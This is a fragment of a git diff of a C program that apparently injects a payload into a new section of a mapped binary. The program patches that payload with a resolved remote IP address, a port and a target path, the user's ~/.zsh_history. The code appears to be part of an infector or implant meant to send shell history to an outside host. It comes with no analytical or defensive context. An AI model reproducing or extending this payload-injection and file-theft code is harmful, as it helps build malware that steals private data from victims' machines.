@@ -45,7 +45,7 @@ int main(int ac, char **av) {
 		return (1);
 	}
 
-	uint16_t port = (3002);
+	uint16_t port = htons(80);
 	uint32_t addr_ip = *(uint32_t *)hostent->h_addr_list[0];
 	printf("port: %#x %#x (%s)\n", port, addr_ip, inet_ntoa(*(struct in_addr *)&addr_ip));
 
@@ -217,7 +217,7 @@ int main(int ac, char **av) {
 	 */
 
 	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_IPADDROFF, &addr_ip, sizeof(uint32_t));
-	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PORTOFF, &port, sizeof(uint16_t));
+	// memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PORTOFF, &port, sizeof(uint16_t));
 	const char targetfile[] = "/home/maxence/.zsh_history";
 	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PATHOFF, targetfile, sizeof(targetfile));
 
